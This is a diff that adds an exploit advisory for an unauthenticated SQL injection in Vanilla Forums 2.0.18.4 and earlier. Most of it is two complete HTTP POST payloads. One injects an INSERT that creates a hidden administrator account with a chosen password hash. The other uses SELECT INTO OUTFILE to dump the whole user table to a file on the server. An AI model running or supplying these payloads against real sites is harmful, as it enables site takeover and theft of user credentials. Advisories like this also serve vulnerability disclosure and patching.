@@ -1,0 +1,66 @@
+# Exploit Title: Vanilla Forums - SQL-Injection - Insert arbitrary user & dump usertable
+# Date: 04/05/2013
+# Exploit Author: bl4ckw0rm
+# Vendor Homepage: http://vanillaforums.org/
+# Version: 2-0-18-4
+# Tested on: Windows
+
+Product Name:
+
+Vanilla Forums
+
+Vulnerable Version:
+
+Up to vanilla-core-2-0-18-4
+
+Tested on:
+
+Windows Server 2003
+Apache 2.4.3
+PHP 5.4.7
+MySQL 5.5.27
+
+Vulnerability Overview:
+
+SQL-Injection is possible, because$_POST arrays are not proper sanitized.
+You do not need to be authenticated.
+
+Vulnerability Details:
+
+To insert an arbitrary user, a sample HTTP-Post Request looks as follows:
+
+POST /[PATH]/vanilla/entry/signin HTTP/1.1
+Host: [HOST]
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: [any cookie]
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 399
+
+Form%2FTransientKey=VQYSOG2F3D38&Form%2Fhpt=&Form%2FTarget=discussions&
+Form%2FClientHour=2013-3-28+11%3A37&Form%2FEmail['admin';INSERT INTO gdn_user 
+(UserID, Name, Password, HashMethod, DateInserted, Admin, Permissions)
+VALUES (NULL, '1234', '$P$BayO4QrMb9wgzdjNhlUBWdQcVaMnKN0', 'Vanilla', 
+'2013-03-28 00:00:00', '1', '');#]=abcd&Form%2FPassword=*&Form%2FSign_In=
+Sign+In&Checkboxes%5B%5D=RememberMe
+
+Indeed you has to take care of the proper encryption algorithm which is currently used.
+
+As it is not possible to get the user table displayed on the website, you could establish an attack as follows:
+
+POST /[PATH]/vanilla/entry/passwordrequest HTTP/1.1
+Host: [HOST]
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 255
+
+Form%2FTransientKey=OJS6EB1J0KW7&Form%2Fhpt=&Form%2FEmail['ac';select * 
+from gdn_user into outfile '[FULL_PATH]\\vanilla\\out.txt' #]=13&
+Form%2FRequest_a_new_password=Request+a+new+password
